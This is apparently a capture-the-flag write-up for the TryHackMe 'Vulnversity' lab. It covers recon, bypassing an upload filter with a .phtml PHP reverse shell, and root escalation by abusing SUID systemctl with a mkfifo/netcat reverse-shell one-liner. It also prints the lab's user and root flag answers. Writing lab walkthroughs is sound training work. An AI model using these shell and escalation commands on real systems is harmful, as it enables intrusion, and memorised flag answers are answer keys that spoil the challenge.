# [Vulnversity](https://tryhackme.com/room/vulnversity)

> Learn about active recon, web app attacks and privilege escalation.

## Scanning

scan the machine

```
nmap -A -T4 10.10.196.8
```

there are 6 open ports (21,22,139,445,3128,3333)

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/9c7adb96-ae21-4b38-bea3-9d92fde29702)

## HTTP

check the webpage at port 3333

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/b8b3e220-516e-4d95-86d1-e8b556b94a44)

## Enumeration

scan the directory with gobuster

```
gobuster dir -u http://10.10.196.8:3333 -w /usr/share/wordlists/dirb/common.txt -t 30
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/b5640201-d855-4903-913a-f6faffeea033)

i found a secret directory /internal allow file upload

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/6f9e353e-3e6f-4b58-b7cf-0482c3edc85f)

## Exploitation

let's create a reverse shell

```
cp /usr/share/webshells/php/php-reverse-shell.php reverse.php
vi reverse.php
```

when submit, i see it filtered

so, try find out the allowed extension with Burp intruder

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/f369fd74-089e-48f7-bf99-93c14ba77bf4)

make a wordlist with the following extensions

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/bd47c0ca-1c0d-4de0-95fe-0cadc87732cb)

you can see a diffirent length in .phtml

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/233ac524-a9dd-46ea-9217-3002bdde14ff)

check the /internal/uploads 

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/8f9543c1-1be6-4190-bda8-196f8340c037)

open a netcat listener

```
nc -vlnp 1234
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/9b0c8e33-8818-4dcd-b24b-c4855fbc8831)

look around home folder, see a user call `bill` and our flag

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/8a1d2344-f984-4341-8842-10418b04bc8c)

| Flag | user.txt |
| --- | --- |
| Answer | 8bd7992fbe8a6ad22a63361004cfcedb |

## Privilege Escalation

listing file with suid bit

```
find / -user root -perm -4000 2> /dev/null
```

i see an interest `/bin/systemctl`

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/9d1c8d67-9cb2-407e-825b-c5c9de6729fc)

i found a document for it

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/e28e2f76-b8c6-4eed-847f-b9432954e687)

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.37.45 4444 >/tmp/f" > /tmp/rev.sh
```

prepare netcat listener first

```
nc -vlnp 4444
```

now create a service and run it with systemctl to get root

```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "bash /tmp/rev.sh"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/9c6fdfcf-ac6e-4b14-9de2-b4fceff692c6)

here you are

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/cdb6c9c5-583f-4946-b96d-8dbf026d2ba0)

| Flag | root.txt |
| --- | --- |
| Answer | a58ff8579f0a9270368d33a9966c7fd5 |
